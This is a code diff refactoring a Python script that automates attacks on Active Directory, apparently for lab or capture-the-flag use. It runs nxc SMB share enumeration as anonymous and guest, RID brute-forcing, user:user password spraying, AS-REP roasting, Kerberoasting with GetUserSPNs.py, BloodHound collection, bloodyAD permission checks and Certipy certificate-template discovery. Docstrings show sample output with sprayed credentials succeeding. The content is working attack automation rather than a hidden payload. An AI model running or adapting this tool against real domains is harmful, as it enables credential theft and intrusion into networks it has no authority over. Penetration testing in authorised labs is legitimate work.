+                    "Enumerate SMB shares (Anonymous) ", retry_on_invalid=True)
+        
+        # Add delay between commands to avoid connection issues
+        time.sleep(1)
 
-        # Guest Shares
+        # Guest Shares - with intelligent retry
         run_command(["nxc", "smb", r, "-u", "guest", "-p", "", "--shares"],
-                    "Enumerate SMB shares (Guest) ")
+                    "Enumerate SMB shares (Guest) ", retry_on_invalid=True)
+        
+        # Add delay before RID brute-force
+        time.sleep(1)
 
         # RID Brute-Force to create user list 
         create_users_from_nxc(r)
-
-   
 
 
 # patterns to find anywhere in an output line
@@ -809,15 +1010,28 @@ def _line_matches(line: str) -> bool:
 
 def try_user_user_file(file_path, target, note="Try user:user", timeout=30):
     """
-    Silent user:user spray that prints progress + exact result lines.
-    Accepts `note` so callers can pass explanatory text (e.g. "Attempt user:user").
-
-    Output style:
-      [*] Starting user:user spray (Checking users.txt)...
-      $ nxc smb 10.129.234.71 -u <user> -p <user> --continue-on-success
-      [-] baby.vl\\Guest:Guest STATUS_LOGON_FAILURE
-      ...
-      [+] baby.vl\\Joseph.Hughes:Joseph.Hughes Authenticated!
+    Perform user:user password spray attack using usernames from a file.
+    
+    Args:
+        file_path: Path to file containing usernames (one per line)
+        target: Target IP address
+        note: Description of the spray attempt (for logging)
+        timeout: Timeout in seconds for each authentication attempt
+    
+    Behavior:
+        - Reads usernames from file_path
+        - Attempts authentication with username:username for each user
+        - Prints only lines matching success/failure patterns
+        - Silently skips empty lines
+    
+    Output patterns matched:
+        [+], [-], [!], STATUS_*, Authenticated, Connection Error
+    
+    Example output:
+        [*] Starting Try user:user (Checking users.txt)...
+        $ nxc smb 10.10.10.161 -u <user> -p <user> --continue-on-success
+        [-] CORP\\Guest:Guest STATUS_LOGON_FAILURE
+        [+] CORP\\admin:admin Authenticated!
     """
     if not os.path.exists(file_path):
         print_status(f"\n\n[INFO] Username file '{file_path}' not found; skipping {note}.")
@@ -857,25 +1071,46 @@ def try_user_user_file(file_path, target, note="Try user:user", timeout=30):
     print_status("\n[+] User:user spray finished.")
 
 
-def section_3_user_spraying(r, d, u=None, p=None, k=False, cred_status=None):
+def user_spraying(r, d, u=None, p=None, k=False, cred_status=None):
     """
-    cred_status can be:
-      "no-creds", "ok", "kerberos", "bad", "ambiguous"
-    If cred_status is provided we won't re-run the SMB verify inside this function.
+    Perform AS-REP roasting and user:user password spraying.
+    
+    Args:
+        r: Target IP address
+        d: Domain name (e.g., CORP.LOCAL)
+        u: Username (None if no credentials provided)
+        p: Password (None if no credentials provided)
+        k: Boolean indicating if Kerberos authentication is enabled
+        cred_status: Credential validation status from verify_credentials()
+                    Values: "no-creds", "ok", "kerberos", "bad", "ambiguous"
+    
+    Behavior:
+        With credentials:
+            - Skips if cred_status == "bad"
+            - Runs AS-REP roasting with GetNPUsers.py
+            - Returns without password spraying (authenticated mode)
+        
+        Without credentials:
+            - Runs AS-REP roasting to find users with pre-auth disabled
+            - Attempts user:user password spray using users.txt
+    
+    Requirements:
+        - users.txt must exist for AS-REP roasting
+        - Domain must be discovered for GetNPUsers.py
     """
-    user_spraying_art = r"""User Spraying (AS-REP Roasting)
-  *     * * *  *   *    *  * * 
-   *  **   *     ** * **    *  
-**   *   *      *        **    
-        *      *        *      
- *   *          *        *     
-                          *    
-*                              
-  *        *  *    *        *  
-                       *      *
-      *     *       *        * 
-         *    *               *
-   *   *  *       *   *    *   """
+    user_spraying_art = r"""AS-REP Roasting & Credential Spraying
+*   *    *  * * * * ***  **     * * *
+  ** * **    *     *   *   *  **   * 
+ *        **            *    *   *   
+*        *                *     *    
+ *        *                  *       
+           *      *     *  *         
+                     *               
+    *        *      * **           * 
+        *                            
+     *        *               *     *
+                                 *   
+   *   *    *      *     *     *  *  """
 
     print_header(user_spraying_art)
 
@@ -931,8 +1166,30 @@ def section_3_user_spraying(r, d, u=None, p=None, k=False, cred_status=None):
     try_user_user_file(USERS_FILE, r, note="Attempt user:user")
 
 
-def section_4_kerberoasting(r, f, d, u, p, k):
-    """Runs Kerberoasting and returns True if NTLM fails and Kerberos is needed."""
+def kerberoasting(r, f, d, u, p, k):
+    """
+    Attempt Kerberoasting attack to extract service account hashes.
+    
+    Args:
+        r: Target IP address
+        f: Fully qualified domain name of DC
+        d: Domain name
+        u: Username
+        p: Password
+        k: Boolean indicating if Kerberos authentication is enabled
+    
+    Returns:
+        bool: True if NTLM negotiation failed and Kerberos rerun is needed, False otherwise
+    
+    Behavior:
+        - Uses GetUserSPNs.py to request TGS tickets for service accounts
+        - Detects if NTLM is disabled (Kerberos-only environment)
+        - Triggers script restart with Kerberos if NTLM fails
+    
+    Output:
+        - Service account hashes (if successful)
+        - Kerberos requirement detection (if NTLM fails)
+    """
     kerberoasting_art = r"""Find SPNs (Kerberoasting)
 ** *        * **  *  * * 
   *   **   * *  **    *  
@@ -967,7 +1224,7 @@ def section_4_kerberoasting(r, f, d, u, p, k):
     return False
 
 
-def section_5_bloodhound(r, f, d, u, p, k):
+def bloodhound(r, f, d, u, p, k):
     bloodhound_art = r"""Collect BloodHound Data
 *   **  *   **   * ** *
  ***     ***  * *      
@@ -1017,7 +1274,6 @@ def section_5_bloodhound(r, f, d, u, p, k):
         current_attempt += 1
         if current_attempt <= max_retries:
             print_status("[-] BloodHound collector failed. Retrying in 5 seconds...")
-            import time
             time.sleep(5)
         
     # If the loop finishes without returning, all attempts failed
@@ -1026,7 +1282,7 @@ def section_5_bloodhound(r, f, d, u, p, k):
     print_status("[-] Check the output above for reasons like invalid credentials, DNS failure, or network block.")
 
 
-def section_6_bloodyad(r, u, p, k, d, f):
+def bloodyad(r, u, p, k, d, f):
     bloodyad_art = r"""Check Permissions (bloodyAD)
 ****   *  *  *     *   * ** 
     * * **    **    ***     
@@ -1051,7 +1307,7 @@ def section_6_bloodyad(r, u, p, k, d, f):
 
     run_command(cmd, "Check for writable objects with bloodyAD", is_shell_command=True)
 
-def section_7_adcs_certipy(r, f, d, u, p, k):
+def adcs_certipy(r, f, d, u, p, k):
     adcs_art = """ADCS Enumeration (Certipy)
 ***  *   * * *    **  *   
       * * *   **    *  *  
@@ -1084,7 +1340,6 @@ def section_7_adcs_certipy(r, f, d, u, p, k):
         run_command(certipy_cmd, "Find vulnerable cert templates (NTLM)")
 
 
-
 def main():
     parser = argparse.ArgumentParser(
         description="Automated Active Directory Enumeration Script for Educational/Lab Use.",
@@ -1092,7 +1347,6 @@ def main():
         epilog="""Example Usage:
  Basic: python ad_enum_script_v4.py -r 10.10.10.161
  Auth:  python ad_enum_script_v4.py -r 10.10.10.161 -u 'user' -p 'pass'
- Cert:  python ad_enum_script_v4.py -r 10.10.10.161 -u 'user' --pfx-cert user.pfx --pfx-pass 'password'
 """
     )
     # Core arguments
@@ -1112,8 +1366,8 @@ def main():
     run_authenticated_checks = True
 
     while run_authenticated_checks:
-
-        ascii_art = r"""                        
+        if not args.kerberos:
+            ascii_art = r"""                        
                                                         
          .8.          8 888888888o.      8 8888888888   
         .888.         8 8888    `^888.   8 8888         
@@ -1127,72 +1381,68 @@ def main():
 .8'       `8. `88888. 8 888888888P'      8 888888888888 
                  
                             by Ｂｌｕｅ  Ｐｈｏ３ｎｉｘ                                      
-        """
+            """
 
-        # Print the colored ASCII Art
-        print(colored("\n" + ascii_art, "magenta")) # You can change "green" to any color
-        print(colored(f"\n[CONFIG] Target IP:", "blue") + colored(f" {args.rhosts}", "white"))
-        print(colored(f"[CONFIG] Domain:", "blue") + colored(f"    {args.domain or 'Not Provided. Script will attempt discovery.'}", "white"))
-        print(colored(f"[CONFIG] FQDN:", "blue") + colored(f"      {args.fqdn or 'Not Provided. Script will attempt discovery.'}", "white"))
-        print(colored(f"[CONFIG] User:", "blue") + colored(f"      {args.username or 'Anonymous/Guest'}", "white"))
-        print(colored(f"[CONFIG] Password:", "blue") + colored(f"  {args.password or 'Not Provided'}", "white"))
-        print(colored(f"[CONFIG] Kerberos:", "blue") + colored(f"  {'Enabled' if args.kerberos else 'Disabled'}", "white"))
+            # Print the colored ASCII Art
+            print(colored("\n" + ascii_art, "magenta"))
+            print(colored(f"\n[CONFIG] Target IP:", "blue") + colored(f" {args.rhosts}", "white"))
+            print(colored(f"[CONFIG] Domain:", "blue") + colored(f"    {args.domain or 'Not Provided. Script will attempt discovery.'}", "white"))
+            print(colored(f"[CONFIG] FQDN:", "blue") + colored(f"      {args.fqdn or 'Not Provided. Script will attempt discovery.'}", "white"))
+            print(colored(f"[CONFIG] User:", "blue") + colored(f"      {args.username or 'Anonymous/Guest'}", "white"))
+            print(colored(f"[CONFIG] Password:", "blue") + colored(f"  {args.password or 'Not Provided'}", "white"))
+            print(colored(f"[CONFIG] Kerberos:", "blue") + colored(f"  {'Enabled' if args.kerberos else 'Disabled'}", "white"))
 
         run_authenticated_checks = False
-        
+        if not args.kerberos:
+            check_dependencies()
 
-
-
-        check_dependencies()
-
-
-        # Check if host is up 
-        if not check_host_nmap(args.rhosts):
-            print_status(f"[!] Host Inactive")
-            print_status(f"[-] Target IP {args.rhosts} did not respond to nmap scan.")
-            print_status("[-] Please check the IP address and network connectivity.")
-            sys.exit(1)
-
-        # If creds provided, run Kerberos-first verification NOW (this sets args.kerberos when needed)
-        cred_status = "no-creds"
-        if args.username and args.password:
-            cred_status = verify_credentials(args.rhosts, args.username, args.password, fqdn=args.fqdn, domain=args.domain)
-            if cred_status == "kerberos":
-                args.kerberos = True
-                print_status("[+] Enabling Kerberos for subsequent checks (detected from probe).")
-            elif cred_status == "bad":
-                print_status("\n[-] Stopping: invalid credentials supplied. Fix credentials or rerun without them to continue anonymous checks.")
+        # Check if host is up
+        if not args.kerberos:
+            if not check_host_nmap(args.rhosts):
+                print_status(f"[!] Host Inactive")
+                print_status(f"[-] Target IP {args.rhosts} did not respond to nmap scan.")
+                print_status("[-] Please check the IP address and network connectivity.")
                 sys.exit(1)
-            elif cred_status == "ambiguous":
-                print_status("\n[!] Credential verification ambiguous — proceeding but be cautious; you can rerun without creds for anonymous checks.")
-        
-        
 
-        # LDAP Discovery (Always Runs)
-        discovered_domain, discovered_fqdn, needs_rerun_from_ldap = section_1_ldap_discovery(
-            args.rhosts, args.username, args.password, args.kerberos
-        )
-        if discovered_domain:
-            args.domain = discovered_domain
-        if discovered_fqdn:
-            args.fqdn = discovered_fqdn
+        # This discovers domain/fqdn
+        if not args.kerberos:
+            discovered_domain, discovered_fqdn = domain_discovery(args.rhosts)
+            if discovered_domain:
+                args.domain = discovered_domain
+            if discovered_fqdn:
+                args.fqdn = discovered_fqdn
+            
+        if not args.kerberos:
+            # If creds provided, run Kerberos-first verification NOW (this sets args.kerberos when needed)
+            cred_status = "no-creds"
+            needs_rerun_from_creds = False
+            if args.username and args.password:
+                cred_status = verify_credentials(args.rhosts, args.username, args.password, args.kerberos, args.fqdn, args.domain)
+                if cred_status == "kerberos":
+                    needs_rerun_from_creds = True
+                    print_status("[+] Credential verification indicates Kerberos required.")
+                elif cred_status == "bad":
+                    print_status("\n[-] Stopping: invalid credentials supplied. Fix credentials or rerun without them to continue anonymous checks.")
+                    sys.exit(1)
+                elif cred_status == "ambiguous":
+                    print_status("\n[!] Credential verification ambiguous — proceeding but be cautious; you can rerun without creds for anonymous checks.")
 
-        
-        # If LDAP required Kerberos and we do have creds, restart the loop in Kerberos mode
-        if needs_rerun_from_ldap and not args.kerberos and args.username and args.password:
-            args.kerberos = True
-            print_status("\n[+] LDAP discovery indicates Kerberos-only environment.")
-            print_status("[*] Restarting enumeration with Kerberos enabled.")
-            run_authenticated_checks = True
-            continue 
+            # Check required Kerberos and we're not already in Kerberos mode, restart
+            if needs_rerun_from_creds and not args.kerberos and args.username and args.password:
+                args.kerberos = True
+                print_status("\n[+] Kerberos-only environment detected.")
+                print_status("[*] Restarting enumeration with Kerberos enabled.")
+                run_authenticated_checks = True
+                continue 
 
-        
+        ldap_enumeration(args.rhosts, args.username, args.password, args.kerberos)
+
         # SMB Enumeration
-        section_2_smb_enum(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
+        smb_enum(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
 
         # User Spraying / AS-REP Roasting
         if args.domain:
-            section_3_user_spraying(args.rhosts, args.domain, args.username, args.password, k=args.kerberos, cred_status=cred_status)
+            user_spraying(args.rhosts, args.domain, args.username, args.password, k=args.kerberos, cred_status=cred_status)
         else:
             print_status("\n[!] Skipping User Spraying (AS-REP Roasting), as it requires domain discovery.")
 
@@ -1203,7 +1453,7 @@ def main():
             print_status("\n[!] Skipping advanced authenticated checks, as they require discovered domain and fqdn.")
         else:
             # Kerberoasting (this can flip to Kerberos if NTLM fails later)
-            rerun_kerberos = section_4_kerberoasting(
+            rerun_kerberos = kerberoasting(
                 args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos
             )
 
@@ -1215,9 +1465,9 @@ def main():
                 continue
 
             # Continue with remaining authenticated tasks
-            section_5_bloodhound(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
-            section_6_bloodyad(args.rhosts, args.username, args.password, args.kerberos, args.domain, args.fqdn)
-            section_7_adcs_certipy(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
+            bloodhound(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
+            bloodyad(args.rhosts, args.username, args.password, args.kerberos, args.domain, args.fqdn)
+            adcs_certipy(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
 
     print_status("\n[+] Enumeration script finished.\n")
 
